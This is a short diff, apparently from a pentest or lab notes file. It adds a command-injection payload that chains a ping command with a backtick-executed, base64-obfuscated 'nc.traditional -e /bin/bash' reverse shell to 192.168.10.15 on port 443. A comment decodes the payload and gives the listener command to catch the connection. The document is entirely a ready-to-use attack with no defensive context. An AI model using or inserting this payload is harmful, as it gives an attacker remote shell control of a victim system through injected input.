@@ -1,1 +1,2 @@
-
+ping 127.0.0.1 | `echo "bmMudHJhZGl0aW9uYWwgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguMTAuMTUgNDQz" | base64 -d`
+# above it base 64 for nc.traditional -e /bin/bash 192.168.10.15 443. this is command execution with reverse connetion. run local listner nc 192.168.10.15 443
